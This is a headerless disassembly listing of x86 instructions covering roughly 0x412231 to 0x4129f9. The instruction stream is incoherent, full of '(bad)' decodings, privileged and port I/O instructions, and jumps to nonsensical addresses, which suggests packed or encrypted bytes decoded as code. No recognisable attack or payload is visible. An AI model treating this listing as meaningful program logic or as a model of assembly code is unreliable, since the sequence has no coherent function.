  412231:	or     ch,BYTE PTR [ebp-0x13]
  412234:	add    DWORD PTR [eax],ebp
  412236:	ins    DWORD PTR es:[edi],dx
  412237:	or     al,0xa6
  412239:	icebp  
  41223a:	fist   DWORD PTR [edi-0x4652f77d]
  412240:	xchg   edi,eax
  412241:	jne    0x41226a
  412243:	fidiv  WORD PTR [edx]
  412245:	enter  0xbdc5,0xba
  412249:	imul   esp,DWORD PTR [esp+edi*4],0xab8a585b
  412250:	cmc    
  412251:	fist   DWORD PTR [esi-0x3a]
  412254:	xor    esi,esp
  412256:	test   al,0x41
  412258:	add    dl,BYTE PTR ds:0x95e7ab02
  41225e:	dec    ebx
  41225f:	or     eax,DWORD PTR [bx+si]
  412262:	sti    
  412263:	xor    eax,0x8a3e1ad0
  412268:	fcmovnb st,st(4)
  41226a:	jbe    0x412282
  41226c:	jp     0x41222d
  41226e:	cmp    eax,0x7c6ad71a
  412273:	mov    edi,0xe2be309f
  412278:	and    esp,ebx
  41227a:	sub    eax,0x166fcabd
  41227f:	dec    esi
  412280:	or     ecx,DWORD PTR [ebx-0x4a]
  412283:	cdq    
  412284:	jno    0x412267
  412286:	ror    ah,1
  412288:	jne    0x4122b3
  41228a:	inc    ecx
  41228b:	pop    ss
  41228c:	cdq    
  41228d:	jb     0x41229e
  41228f:	cwde   
  412290:	sub    eax,0x80dd1174
  412295:	inc    edx
  412296:	hlt    
  412297:	lods   al,BYTE PTR ds:[esi]
  412298:	(bad)  
  41229a:	arpl   WORD PTR [eax-0x55],di
  41229d:	rol    DWORD PTR [ebp+eiz*4-0x53ed3757],1
  4122a4:	in     eax,dx
  4122a5:	add    DWORD PTR es:0x2c05cf07,ebp
  4122ac:	mov    ds:0x42e5ec75,al
  4122b1:	mov    bl,0x7c
  4122b3:	cdq    
  4122b4:	mov    dl,0x30
  4122b6:	mov    ds:0x569fd834,al
  4122bb:	pop    eax
  4122bc:	xor    DWORD PTR [eax+0x4f3ac478],esp
  4122c2:	dec    ebx
  4122c3:	cmp    al,0x1b
  4122c5:	aad    0x54
  4122c7:	or     BYTE PTR [edx-0x1e],0x4d
  4122cb:	dec    esi
  4122cc:	add    ecx,ebp
  4122ce:	xor    eax,0x3806c6f9
  4122d3:	mov    BYTE PTR [ebp+0x497e10ef],dh
  4122d9:	and    DWORD PTR [esi],ebx
  4122db:	sub    edi,ebp
  4122dd:	test   eax,0x6f2ac17f
  4122e2:	push   es
  4122e3:	pop    edi
  4122e4:	jg     0x412351
  4122e6:	shl    BYTE PTR [ebx+0x79],1
  4122e9:	fwait
  4122ea:	loopne 0x4122dd
  4122ec:	retf   
  4122ed:	test   edi,ebx
  4122ef:	add    al,0x64
  4122f1:	in     al,0xe4
  4122f3:	lock in al,0x27
  4122f6:	xchg   esp,eax
  4122f7:	ins    DWORD PTR es:[edi],dx
  4122f8:	push   es
  4122f9:	or     edi,DWORD PTR [ecx-0x51]
  4122fc:	gs inc esi
  4122fe:	push   ecx
  4122ff:	cmc    
  412300:	pop    ebp
  412301:	cmp    eax,0x2f398b4a
  412306:	xchg   ecx,eax
  412307:	dec    edi
  412308:	popa   
  412309:	pushf  
  41230a:	aas    
  41230b:	cmp    edi,DWORD PTR ss:[esp+eiz*8+0x2d5ae36a]
  412313:	pop    es
  412314:	jmp    0x412391
  412316:	mov    dh,0x27
  412318:	inc    edi
  412319:	imul   ebp,DWORD PTR [esi+0x17],0xd0f50af3
  412320:	lahf   
  412321:	retf   
  412322:	out    0x9c,al
  412324:	(bad)  
  412325:	mov    bh,0xc6
  412327:	mov    edi,0xc50084d5
  41232c:	in     eax,0xdb
  41232e:	cmp    esp,ecx
  412330:	inc    ebx
  412331:	cmp    al,0x6c
  412333:	mov    esi,DWORD PTR ds:0xc4d4b3d8
  412339:	pop    esi
  41233a:	(bad)  
  41233b:	mov    esp,0xb2f11d0b
  412340:	fcom   QWORD PTR [eax+edi*8]
  412343:	and    ebp,0xffffffd9
  412346:	mov    dh,0xa7
  412348:	xchg   esp,eax
  412349:	and    al,0x1e
  41234b:	stc    
  41234c:	mov    dl,0x4
  41234e:	dec    esp
  41234f:	sub    dl,BYTE PTR [ebx+0x69]
  412352:	fadd   DWORD PTR [edx+edx*2+0x4e]
  412356:	out    dx,eax
  412357:	loopne 0x4122f8
  412359:	outs   dx,BYTE PTR ds:[esi]
  41235a:	popf   
  41235b:	fmul   QWORD PTR [edx+ebp*8-0x1]
  41235f:	mov    bh,0xc6
  412361:	xchg   ebx,eax
  412362:	jnp    0x412364
  412364:	pop    es
  412365:	test   al,0x20
  412367:	or     eax,0xbb209fb8
  41236c:	repnz popf 
  41236e:	mov    dl,0x50
  412370:	mov    dl,0x87
  412372:	int3   
  412373:	fmulp  st(6),st
  412375:	mov    cl,0x56
  412377:	test   dh,ah
  412379:	mov    ebx,0x29e730d0
  41237e:	sbb    bl,BYTE PTR [esi-0x6ceb439f]
  412384:	loope  0x412365
  412386:	mov    edi,DWORD PTR [ebx+0xc19ca3a]
  41238c:	xchg   edi,eax
  41238d:	inc    ecx
  41238e:	sar    BYTE PTR [ecx],cl
  412390:	mov    eax,ds:0xfcb36219
  412395:	into   
  412396:	mov    ds:0xd52c3f19,al
  41239b:	mov    ecx,DWORD PTR [ebx]
  41239d:	jle    0x4123e0
  41239f:	mov    eax,ds:0x979441f6
  4123a4:	and    eax,0x621f8b53
  4123a9:	lods   al,BYTE PTR ds:[esi]
  4123aa:	xor    BYTE PTR fs:[eax],bl
  4123ad:	aam    0x40
  4123af:	jmp    0x109ee10e
  4123b4:	and    esp,ebx
  4123b6:	mov    DWORD PTR [ecx+0x36a3cf8a],edi
  4123bc:	lahf   
  4123bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4123be:	push   0xe6acdb75
  4123c3:	ss push 0xffffff86
  4123c6:	xchg   ecx,eax
  4123c7:	mov    ebp,0x48c9f6
  4123cc:	inc    ecx
  4123cd:	loopne 0x412428
  4123cf:	icebp  
  4123d0:	push   es
  4123d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4123d2:	ds xor edi,esi
  4123d5:	leave  
  4123d6:	cmp    ebp,eax
  4123d8:	in     al,0x62
  4123da:	int    0x6e
  4123dc:	sub    cl,BYTE PTR [edx]
  4123de:	cs sub bl,ah
  4123e1:	data16 add al,0x93
  4123e4:	test   DWORD PTR [eax-0x3e],0x8308f3fc
  4123eb:	and    ebp,edx
  4123ed:	pop    esp
  4123ee:	fcomp  DWORD PTR [ebp+0x62]
  4123f1:	push   edx
  4123f2:	add    BYTE PTR [esi+0x4231f6b0],bh
  4123f8:	neg    BYTE PTR [esi+0x1a]
  4123fb:	out    0x4e,eax
  4123fd:	mov    edi,0x2eed7046
  412402:	cmc    
  412403:	add    ebx,ebp
  412405:	push   es
  412406:	jecxz  0x41239b
  412408:	pop    esi
  412409:	cmp    ecx,DWORD PTR [eax-0x2b]
  41240c:	aas    
  41240d:	iret   
  41240e:	sbb    eax,0xfd4fceef
  412413:	lds    edx,FWORD PTR [edi+0x2c]
  412416:	jmp    0x41242a
  412418:	adc    esp,DWORD PTR [ebp-0x4a402643]
  41241e:	push   es
  41241f:	sar    BYTE PTR cs:[edi-0x41],0x45
  412424:	out    0x6d,eax
  412426:	dec    ebx
  412427:	icebp  
  412428:	dec    esi
  412429:	ret    
  41242a:	mov    al,ds:0x38ee70fe
  41242f:	jp     0x4123e3
  412431:	les    esp,FWORD PTR [ecx+0x50]
  412434:	sub    eax,0xfc12efb4
  412439:	fistp  WORD PTR [ebx+0x74]
  41243c:	add    al,0xde
  41243e:	or     eax,0x58ea598
  412443:	xchg   edx,eax
  412444:	(bad)  
  412446:	cdq    
  412447:	(bad)  
  412448:	xchg   esp,eax
  412449:	push   edi
  41244a:	jg     0x4123e1
  41244c:	jmp    0xa0ae:0xf449185e
  412453:	call   0xe1159e22
  412458:	inc    ecx
  412459:	rcr    ah,1
  41245b:	test   al,0xf9
  41245d:	aas    
  41245e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41245f:	mov    esp,ebx
  412461:	repnz into 
  412463:	(bad)  
  412464:	packsswb mm2,QWORD PTR [ecx]
  412467:	fild   WORD PTR [esi+0x673fff16]
  41246d:	sti    
  41246e:	or     eax,0x1e920d64
  412473:	loopne 0x4124ce
  412475:	mul    DWORD PTR [eax-0xd]
  412478:	mov    al,ds:0x5801af8c
  41247d:	stos   BYTE PTR es:[edi],al
  41247e:	sub    eax,0xf3487914
  412483:	xchg   esp,eax
  412484:	and    bh,dl
  412486:	jns    0x4124a2
  412488:	xor    eax,0xf6a1ed10
  41248d:	xor    DWORD PTR [edi],edx
  41248f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412490:	jmp    0x412426
  412492:	jns    0x412423
  412494:	jl     0x412467
  412496:	ret    0x6358
  412499:	and    al,0x85
  41249b:	cmp    ecx,DWORD PTR [ecx+0x1399255]
  4124a1:	mov    cl,0xa2
  4124a3:	mov    ah,0x50
  4124a5:	push   0xce21cbd1
  4124aa:	pop    es
  4124ab:	mov    eax,ds:0x8b7a08ca
  4124b0:	dec    eax
  4124b1:	jecxz  0x41244e
  4124b3:	and    bl,ah
  4124b5:	outs   dx,DWORD PTR ds:[esi]
  4124b6:	jp     0x412504
  4124b8:	xor    al,0x90
  4124ba:	imul   ecx,DWORD PTR [ecx+edx*4],0x8fbe4f06
  4124c1:	or     al,0xfb
  4124c3:	imul   esi,DWORD PTR [eax+eiz*1],0xf003d70
  4124ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4124cb:	fs cmp esp,ecx
  4124ce:	inc    ecx
  4124cf:	test   esp,eax
  4124d1:	int    0xd6
  4124d3:	fwait
  4124d4:	xchg   edx,eax
  4124d5:	xchg   esp,eax
  4124d6:	add    ecx,edi
  4124d8:	jo     0x4124e1
  4124da:	jno    0x41250c
  4124dc:	xchg   esi,eax
  4124dd:	xchg   DWORD PTR [ecx],ebx
  4124df:	xchg   edx,eax
  4124e0:	retf   0x5faf
  4124e3:	enter  0x1c3f,0x69
  4124e7:	das    
  4124e8:	xchg   esp,eax
  4124e9:	mov    ah,0x17
  4124eb:	shl    BYTE PTR [edi-0x6669d9a2],1
  4124f1:	outs   dx,BYTE PTR ds:[esi]
  4124f2:	push   ecx
  4124f3:	and    dh,bh
  4124f5:	sbb    al,0x7e
  4124f7:	sub    BYTE PTR [edx+0x37],bh
  4124fa:	mov    bl,0xa5
  4124fc:	enter  0xdadf,0xc6
  412500:	mov    gs,WORD PTR [esi-0x52440590]
  412506:	and    ebp,esi
  412508:	sub    al,0x5a
  41250a:	dec    esp
  41250b:	inc    edi
  41250c:	adc    eax,0xc13975dd
  412511:	fimul  WORD PTR [eax+ebx*4+0x50ea87c1]
  412518:	push   edi
  412519:	hlt    
  41251a:	gs jne 0x41258a
  41251d:	dec    ebp
  41251e:	dec    ebx
  41251f:	not    al
  412521:	jnp    0x4124e4
  412523:	dec    esi
  412524:	fstp   TBYTE PTR [ebx-0x2db4fe55]
  41252a:	add    ch,cl
  41252c:	jno    0x4125ab
  41252e:	xchg   edx,eax
  41252f:	cwde   
  412530:	cld    
  412531:	stc    
  412532:	sbb    al,BYTE PTR [eax-0x5c]
  412535:	ja     0x412513
  412537:	mov    dh,0x7d
  412539:	xor    al,0xc4
  41253b:	mov    ebp,0x8293ebf4
  412540:	out    dx,al
  412541:	pop    ecx
  412542:	fwait
  412543:	sbb    al,0xdc
  412545:	inc    edx
  412546:	pop    es
  412547:	ret    0x6645
  41254a:	xor    edx,eax
  41254c:	popa   
  41254d:	fmul   QWORD PTR [edx]
  41254f:	(bad)  
  412551:	cwde   
  412552:	jmp    0x92bcba40
  412557:	or     DWORD PTR [esp+eiz*4+0x42d793e7],eax
  41255e:	retf   0x39f5
  412561:	inc    edx
  412562:	xor    eax,0xd3e4983
  412567:	add    DWORD PTR [eax+0x3c],esi
  41256a:	scas   eax,DWORD PTR es:[edi]
  41256b:	pop    esi
  41256c:	scas   eax,DWORD PTR es:[edi]
  41256d:	and    al,0x61
  41256f:	cmc    
  412570:	scas   al,BYTE PTR es:[edi]
  412571:	(bad)  
  412572:	and    eax,0x43fe9320
  412577:	pop    ss
  412578:	and    dh,dh
  41257a:	push   edx
  41257b:	mov    cl,0x60
  41257d:	lods   al,BYTE PTR ds:[esi]
  41257e:	aad    0xbf
  412580:	dec    ah
  412582:	sub    BYTE PTR [bx+si+0x23],cl
  412586:	js     0x4125e9
  412588:	es test dh,0x9c
  41258c:	clc    
  41258d:	call   0x2da6:0x73dc5a7d
  412594:	aam    0xb1
  412596:	int    0x7a
  412598:	mov    eax,ds:0xfb7d0972
  41259d:	outs   dx,BYTE PTR ds:[esi]
  41259e:	ss test eax,0xec959471
  4125a4:	rcl    BYTE PTR [edi],cl
  4125a6:	aaa    
  4125a7:	sbb    DWORD PTR [edi],esi
  4125a9:	mov    eax,ds:0x8a45a0ae
  4125ae:	mov    eax,0xabcb2072
  4125b3:	add    ebx,DWORD PTR [eax]
  4125b5:	mov    al,0x55
  4125b7:	fwait
  4125b8:	jge    0x4125e2
  4125ba:	add    bh,BYTE PTR [ebx-0x5ee0fd31]
  4125c0:	aad    0x6c
  4125c2:	repz inc esi
  4125c4:	cmc    
  4125c5:	fidiv  WORD PTR [ecx]
  4125c7:	ss dec esi
  4125c9:	pop    edi
  4125ca:	and    ah,BYTE PTR [ecx]
  4125cc:	je     0x41256a
  4125ce:	(bad)  
  4125cf:	aad    0xef
  4125d1:	or     ecx,DWORD PTR [ebx-0x44]
  4125d4:	pop    ebp
  4125d5:	push   cs
  4125d6:	xor    edi,DWORD PTR [edi-0x7010d2b8]
  4125dc:	sub    BYTE PTR [ecx-0x33],0x8d
  4125e0:	or     dh,ah
  4125e2:	pop    edi
  4125e3:	ins    DWORD PTR es:[edi],dx
  4125e4:	aad    0xfd
  4125e6:	push   0xfffffffa
  4125e8:	lods   eax,DWORD PTR ds:[esi]
  4125e9:	fadd   QWORD PTR [ecx]
  4125eb:	pop    ebx
  4125ec:	cmp    ecx,DWORD PTR [bx+di+0x6]
  4125f0:	mov    bl,0x74
  4125f2:	push   0xf1c7cc03
  4125f7:	pop    edx
  4125f8:	or     al,0xce
  4125fa:	(bad)  
  4125fb:	iret   
  4125fc:	pop    esi
  4125fd:	push   eax
  4125fe:	mov    dl,0xcf
  412600:	sub    edi,DWORD PTR [eax+0x6dbdd675]
  412606:	sub    DWORD PTR [edx+esi*2],ebx
  412609:	aam    0x6
  41260b:	dec    eax
  41260c:	or     dl,BYTE PTR [ecx+0x28]
  41260f:	pop    ebx
  412610:	xor    eax,0xb6a503ec
  412615:	cmp    eax,0xea3f370c
  41261a:	and    eax,0xd3c68e60
  41261f:	daa    
  412620:	mov    al,0xdb
  412622:	mov    dl,BYTE PTR [ebx+0x59]
  412625:	jnp    0x412648
  412627:	push   esi
  412628:	gs shl edx,1
  41262b:	xchg   ecx,eax
  41262c:	inc    ebx
  41262d:	xchg   ebp,eax
  41262e:	ret    
  41262f:	xchg   dl,ah
  412631:	test   eax,0x834d7699
  412636:	rcr    DWORD PTR [ebp+0x6a],1
  412639:	xchg   DWORD PTR [ecx+0x3ecfeaa7],ebp
  41263f:	js     0x4126a9
  412641:	out    dx,eax
  412642:	inc    ebp
  412643:	xor    ah,bl
  412645:	rcl    DWORD PTR [eax],0x26
  412648:	push   ebx
  412649:	iret   
  41264a:	xor    al,0xa0
  41264c:	jb     0x412656
  41264e:	aad    0x37
  412650:	es xchg ebp,eax
  412652:	mov    al,ds:0x1e6cb3b8
  412657:	mov    dl,BYTE PTR [eax+0x59b1040c]
  41265d:	call   0xefbb:0xdc1bd48
  412664:	xor    DWORD PTR [esi-0x426835de],esp
  41266a:	add    al,0x31
  41266c:	fnstcw WORD PTR [ecx]
  41266e:	sub    dl,bh
  412670:	xchg   esi,eax
  412671:	jmp    0xa2db:0x53c00d0a
  412678:	add    cl,BYTE PTR [ebx+0x74ed6f5c]
  41267e:	pop    eax
  41267f:	mov    al,0x3f
  412681:	push   esp
  412682:	mov    bh,BYTE PTR [ecx+ebx*4-0x6e3ba391]
  412689:	or     DWORD PTR [eax-0x7d3157c9],esp
  41268f:	cmp    dh,0x9b
  412692:	pop    esp
  412693:	push   esp
  412694:	push   esi
  412695:	jecxz  0x412636
  412697:	sub    eax,DWORD PTR [eax-0x80]
  41269a:	xchg   ecx,eax
  41269b:	rcl    bl,0xed
  41269e:	jne    0x412701
  4126a0:	or     ebp,ebx
  4126a2:	in     al,0xeb
  4126a4:	inc    esi
  4126a5:	adc    dl,BYTE PTR [ebp+0x49]
  4126a8:	mov    ch,0x8a
  4126aa:	dec    ecx
  4126ab:	add    dh,ah
  4126ad:	adc    eax,0x6c2559d4
  4126b2:	lock mov eax,ds:0xf27c98ba
  4126b8:	mov    dl,0x98
  4126ba:	ins    BYTE PTR es:[edi],dx
  4126bb:	out    dx,eax
  4126bc:	xor    al,0xa9
  4126be:	fsubr  DWORD PTR [esi+0x6c]
  4126c1:	push   esi
  4126c2:	out    0xae,al
  4126c4:	mov    esi,0xbdd702a7
  4126c9:	add    BYTE PTR [edx],cl
  4126cb:	cmp    edx,edi
  4126cd:	gs (bad) 
  4126cf:	sbb    esp,edi
  4126d1:	inc    esp
  4126d2:	rol    BYTE PTR ds:0xae4a541b,cl
  4126d8:	sub    BYTE PTR [ebp+0x7b6fc04d],bl
  4126de:	inc    ebp
  4126df:	jmp    0x41273c
  4126e1:	add    BYTE PTR [esi],al
  4126e3:	(bad)  
  4126e4:	inc    edi
  4126e5:	sub    esi,DWORD PTR [ebx]
  4126e7:	nop
  4126e8:	pop    ds
  4126e9:	sub    al,0xdc
  4126eb:	push   edi
  4126ec:	mov    edi,0x938b4f10
  4126f1:	aad    0x85
  4126f3:	call   0x3a7e19e9
  4126f8:	test   DWORD PTR [edx-0x73],ecx
  4126fb:	dec    ebx
  4126fc:	mov    dh,0x84
  4126fe:	dec    eax
  4126ff:	pop    ss
  412700:	cmp    DWORD PTR [eax-0x4e],ebx
  412703:	push   ds
  412704:	push   ds
  412705:	xor    ecx,DWORD PTR [edi-0x56c2aecf]
  41270b:	or     al,BYTE PTR cs:[ecx]
  41270e:	pop    es
  41270f:	push   ecx
  412710:	ja     0x4126b1
  412712:	mov    al,ds:0x28033e10
  412717:	pop    eax
  412718:	cmp    esp,edx
  41271a:	repz jg 0x4126ad
  41271d:	push   esp
  41271e:	pusha  
  41271f:	addr16 shl ch,0xf9
  412723:	and    al,0x75
  412725:	adc    eax,0x4a502a66
  41272a:	fisttp DWORD PTR [ebp-0x69]
  41272d:	inc    ebp
  41272e:	in     al,dx
  41272f:	aam    0x3e
  412731:	das    
  412732:	add    DWORD PTR ds:0x7b5e2a3f,eax
  412738:	lock out 0x82,al
  41273b:	ins    BYTE PTR es:[edi],dx
  41273c:	ret    0x677c
  41273f:	loope  0x41273a
  412741:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412742:	push   ebx
  412743:	inc    edx
  412744:	mov    ds:0x19c4853d,eax
  412749:	jns    0x412783
  41274b:	(bad)  
  41274c:	repz leave 
  41274e:	fidiv  WORD PTR [ecx]
  412750:	pop    es
  412751:	sbb    al,0x61
  412753:	mov    bl,0x6b
  412755:	mov    cl,0x54
  412757:	stos   DWORD PTR es:[edi],eax
  412758:	fist   WORD PTR [ecx-0x6343d06]
  41275e:	or     dl,BYTE PTR [esi]
  412760:	pop    esp
  412761:	(bad)  
  412763:	imul   esi,DWORD PTR ds:0xc32ed5d6,0xc12cf574
  41276d:	adc    eax,0xb34f23d2
  412772:	jae    0x4127dc
  412774:	sar    DWORD PTR [ecx],cl
  412776:	cmc    
  412777:	aam    0x57
  412779:	lea    ecx,[ecx+0x62b10337]
  41277f:	xchg   esp,eax
  412780:	lahf   
  412781:	push   cs
  412782:	mov    ebp,0x400cd517
  412787:	lock cli 
  412789:	sub    edx,DWORD PTR [edx-0x4]
  41278c:	icebp  
  41278d:	cmp    al,0x8
  41278f:	mov    WORD PTR [esi-0x78],gs
  412792:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412793:	pop    ecx
  412794:	outs   dx,BYTE PTR ds:[esi]
  412795:	mov    DWORD PTR [esi+0x602b894c],esp
  41279b:	sahf   
  41279c:	pushf  
  41279d:	jo     0x412772
  41279f:	in     al,dx
  4127a0:	std    
  4127a1:	or     eax,0x477198c6
  4127a6:	test   al,0x1d
  4127a8:	call   0x1605cbde
  4127ad:	fnstcw WORD PTR ds:0x712de9f
  4127b3:	inc    esp
  4127b4:	test   DWORD PTR [eax-0x5e],edx
  4127b7:	or     eax,esi
  4127b9:	sub    ah,BYTE PTR [eax-0x43]
  4127bc:	push   0xd1217720
  4127c1:	shl    BYTE PTR [eax-0x5e],cl
  4127c4:	sub    al,0x88
  4127c6:	call   0x4f149ee8
  4127cb:	sbb    BYTE PTR [edx+ebp*4-0x4fbbd37f],0x92
  4127d3:	hlt    
  4127d4:	xchg   ebx,eax
  4127d5:	imul   ecx,esi,0xffffffff
  4127d8:	inc    edi
  4127d9:	std    
  4127da:	ja     0x4127e6
  4127dc:	pop    ebx
  4127dd:	xchg   ebp,eax
  4127de:	and    BYTE PTR [edi+edx*8+0x1c3a3767],bl
  4127e5:	mov    DWORD PTR [esi],esi
  4127e7:	or     BYTE PTR [ebp+0x9],dl
  4127ea:	sbb    cl,BYTE PTR [ecx]
  4127ec:	fs cmp al,0x98
  4127ef:	sbb    eax,0x3a4db11d
  4127f4:	inc    esi
  4127f5:	jnp    0x412857
  4127f7:	xlat   BYTE PTR ds:[ebx]
  4127f8:	add    DWORD PTR [ecx+eax*4+0x61840790],ecx
  4127ff:	inc    eax
  412800:	arpl   WORD PTR [esi-0x7eeb3375],sp
  412806:	pop    ds
  412807:	mov    cl,0xad
  412809:	cmp    al,0x18
  41280b:	mov    ebx,DWORD PTR [ecx+0x7285eca6]
  412811:	adc    DWORD PTR [edi+0x142840d3],0x20
  412818:	fbld   TBYTE PTR [esi]
  41281a:	sub    bl,dl
  41281c:	icebp  
  41281d:	shl    DWORD PTR [esi],1
  41281f:	pop    ecx
  412820:	stc    
  412821:	inc    edi
  412822:	int    0x82
  412824:	xchg   DWORD PTR [esi],esi
  412826:	cli    
  412827:	scas   al,BYTE PTR es:[edi]
  412828:	lods   eax,DWORD PTR ds:[esi]
  412829:	jecxz  0x412842
  41282b:	xor    edi,0x7eed47b8
  412831:	cmp    ebp,DWORD PTR [edx-0x76]
  412834:	bound  esp,QWORD PTR [esi+0x646e6aa5]
  41283a:	xchg   bl,dl
  41283c:	mov    ch,0x3d
  41283e:	cwde   
  41283f:	mov    WORD PTR [eax-0x6d442e54],gs
  412845:	lods   eax,DWORD PTR ds:[esi]
  412846:	nop
  412847:	ins    BYTE PTR es:[edi],dx
  412848:	cdq    
  412849:	jmp    0x4128b0
  41284b:	push   ebx
  41284c:	push   eax
  41284d:	lock (bad) 
  412850:	daa    
  412851:	ficomp DWORD PTR fs:[eax]
  412854:	adc    eax,0x917b3513
  412859:	cmp    ebp,ebx
  41285b:	aad    0xcc
  41285d:	and    al,0xc7
  41285f:	sub    edi,ecx
  412861:	imul   eax,ecx,0x85205469
  412867:	sub    dl,ch
  412869:	aaa    
  41286a:	push   ecx
  41286b:	push   eax
  41286c:	lea    esi,ds:0x60fdcc09
  412872:	push   cs
  412873:	sti    
  412874:	iret   
  412875:	xor    eax,0xe734c934
  41287a:	loopne 0x4128c6
  41287c:	inc    edi
  41287d:	push   cs
  41287e:	inc    DWORD PTR [ecx]
  412880:	ss call 0xe87d:0xa37e3a0a
  412888:	jo     0x41289c
  41288a:	retf   
  41288b:	jnp    0x412817
  41288d:	ss mov ebp,0x5d44bb16
  412893:	adc    al,0xc5
  412895:	push   esp
  412896:	or     bl,bl
  412898:	jnp    0x412843
  41289a:	repz jmp DWORD PTR [ebp+esi*8-0x58]
  41289f:	inc    ebx
  4128a0:	aaa    
  4128a1:	pop    ss
  4128a2:	into   
  4128a3:	push   edi
  4128a4:	and    esp,DWORD PTR [edx+0x10]
  4128a7:	sbb    BYTE PTR [bp+si],cl
  4128aa:	test   eax,ebx
  4128ac:	sub    cl,BYTE PTR [ecx+ebp*1-0x1cae17a1]
  4128b3:	xchg   esp,eax
  4128b4:	jg     0x412869
  4128b6:	lea    edi,ds:0x8b94b901
  4128bc:	jge    0x412907
  4128be:	inc    eax
  4128bf:	fdivr  DWORD PTR [eax]
  4128c1:	lea    edi,[esi]
  4128c3:	pop    ebx
  4128c4:	loope  0x4128a5
  4128c6:	jp     0x4128aa
  4128c8:	mov    bl,0xcb
  4128ca:	fbld   TBYTE PTR [esi]
  4128cc:	or     eax,0x3b7de9e2
  4128d1:	pop    ebp
  4128d2:	cli    
  4128d3:	xor    dl,BYTE PTR [ebp+0x35]
  4128d6:	frstor ds:0x20c81f5d
  4128dc:	std    
  4128dd:	bound  eax,QWORD PTR [eax]
  4128df:	ins    DWORD PTR es:[edi],dx
  4128e0:	pop    es
  4128e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4128e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4128e3:	ret    0x1820
  4128e6:	pop    esp
  4128e7:	xchg   BYTE PTR [ecx+eiz*8+0x57],dh
  4128eb:	push   eax
  4128ec:	jb     0x4128c0
  4128ee:	jbe    0x412932
  4128f0:	cli    
  4128f1:	jbe    0x412943
  4128f3:	repz sahf 
  4128f5:	out    dx,al
  4128f6:	pop    edx
  4128f7:	mov    bl,0x57
  4128f9:	mov    esp,0x4f419bb
  4128fe:	les    esp,FWORD PTR [ebx+0x55026772]
  412904:	enter  0xc49d,0x86
  412908:	xor    BYTE PTR [edi-0x47],al
  41290b:	jns    0x4128b5
  41290d:	mov    ch,0x70
  41290f:	das    
  412910:	sub    cl,BYTE PTR [esi]
  412912:	loope  0x41294e
  412914:	or     al,dh
  412916:	mov    dh,0x5d
  412918:	lods   al,BYTE PTR ds:[esi]
  412919:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41291a:	inc    ebx
  41291b:	loop   0x4128c4
  41291d:	out    dx,eax
  41291e:	push   esp
  41291f:	jge    0x412987
  412921:	repnz cmp BYTE PTR [esi],0xbb
  412925:	ret    
  412926:	jnp    0x4128aa
  412928:	fisub  WORD PTR [edi+0x2434add5]
  41292e:	sub    edx,DWORD PTR [esi+ecx*8]
  412931:	jle    0x412915
  412933:	mov    ah,0x8c
  412935:	inc    edi
  412936:	jg     0x4128c4
  412938:	jp     0x412993
  41293a:	dec    ebp
  41293b:	pop    esi
  41293c:	jp     0x41296b
  41293e:	test   al,0xac
  412940:	add    edx,eax
  412942:	fwait
  412943:	pushf  
  412944:	lds    esi,FWORD PTR [esi-0x1e]
  412947:	scas   al,BYTE PTR es:[edi]
  412948:	xlat   BYTE PTR ds:[ebx]
  412949:	out    0x16,eax
  41294b:	or     eax,0x818963f0
  412950:	scas   al,BYTE PTR es:[edi]
  412951:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412952:	jecxz  0x412993
  412954:	inc    ebx
  412955:	xchg   ecx,eax
  412956:	mov    WORD PTR [edx-0x56],?
  412959:	es xchg ebp,eax
  41295b:	sti    
  41295c:	outs   dx,BYTE PTR ds:[esi]
  41295d:	in     eax,0xff
  41295f:	adc    ebx,DWORD PTR [ebp+eax*1-0x3f2fda75]
  412966:	pop    ds
  412967:	pop    edx
  412968:	sbb    ebx,DWORD PTR [esi]
  41296a:	jle    0x412968
  41296c:	icebp  
  41296d:	loop   0x412953
  41296f:	add    eax,0xad963ee
  412974:	pop    edi
  412975:	adc    DWORD PTR [edi+0x4fb261fd],esp
  41297b:	(bad)  
  41297d:	sub    DWORD PTR [edx-0x5],edi
  412980:	inc    esp
  412981:	pop    edx
  412982:	pop    esp
  412983:	sbb    al,0x91
  412985:	push   ebp
  412986:	xor    al,0x2b
  412988:	xor    eax,0x5dabcc92
  41298d:	popf   
  41298e:	(bad)  
  41298f:	or     al,0xfe
  412991:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412992:	adc    DWORD PTR [esi+0x104cc072],ecx
  412998:	sub    bh,BYTE PTR [eax-0x6]
  41299b:	test   eax,0x9c3c0343
  4129a0:	mov    eax,ds:0x35e41590
  4129a5:	sbb    esp,esi
  4129a7:	jle    0x41297c
  4129a9:	imul   ecx,DWORD PTR [ebp+0x5b],0x48584fa5
  4129b0:	or     bl,ah
  4129b2:	push   ds
  4129b3:	inc    ebp
  4129b4:	push   ebx
  4129b5:	adc    BYTE PTR [esi],0x3a
  4129b8:	loop   0x4129a2
  4129ba:	cli    
  4129bb:	out    dx,eax
  4129bc:	sub    dh,BYTE PTR [edi+ebx*1]
  4129bf:	retf   0x976e
  4129c2:	add    eax,0xf01d2568
  4129c7:	out    dx,eax
  4129c8:	imul   esi,DWORD PTR [edi],0x51
  4129cb:	fisubr WORD PTR [esi]
  4129cd:	push   esp
  4129ce:	lods   eax,DWORD PTR ds:[esi]
  4129cf:	dec    esi
  4129d0:	pushf  
  4129d1:	or     DWORD PTR [edx+0x20],0x293ae62e
  4129d8:	ret    0x2d66
  4129db:	data16 loope 0x412967
  4129de:	xchg   esi,eax
  4129df:	stos   DWORD PTR es:[edi],eax
  4129e0:	dec    esp
  4129e1:	mov    ds:0x7d0c2a4d,eax
  4129e6:	test   bh,dl
  4129e8:	mov    al,ds:0x372e34e7
  4129ed:	ins    BYTE PTR es:[edi],dx
  4129ee:	adc    eax,0x4411728e
  4129f3:	jge    0x4129bb
  4129f5:	iret   
  4129f6:	jg     0x412996
  4129f8:	aas    
  4129f9:	sbb    DWORD PTR [ecx+0x5bc7dfde],eax
